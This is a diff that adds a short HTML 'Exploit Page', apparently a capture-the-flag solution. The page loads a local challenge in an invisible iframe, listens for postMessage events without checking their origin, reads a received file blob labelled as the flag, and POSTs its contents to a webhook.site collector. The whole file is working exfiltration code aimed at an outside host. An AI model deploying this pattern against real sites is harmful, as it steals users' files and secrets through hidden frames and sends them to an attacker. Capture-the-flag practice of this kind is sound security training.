@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Exploit Page</title>
+</head>
+<body>
+  <h2>Flag Catcher Running...</h2>
+
+  <!-- Invisible iframe that loads the challenge -->
+  <iframe id="challenge-frame" src="http://localhost:1338" style="width:0;height:0;border:0;visibility:hidden;"></iframe>
+
+  <script>
+    window.addEventListener("message", async (event) => {
+      const file = event.data?.files?.[0];
+      if (!file?.blob) {
+        console.warn("No valid file received via postMessage.");
+        return;
+      }
+
+      // Read the blob into text (e.g., the flag)
+      const blob = new Blob([file.blob]);
+      const text = await blob.text();
+
+      // Send the flag to your webhook.site
+      fetch("http://webhook.site/3479a7fe-2390-4039-a92c-9ee26bc2c2fb", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          flag: text,
+          filename: file.name || "flag.txt",
+          timestamp: new Date().toISOString()
+        })
+      });
+
+      console.log("Flag exfiltrated:", text);
+    });
+  </script>
+</body>
+</html>
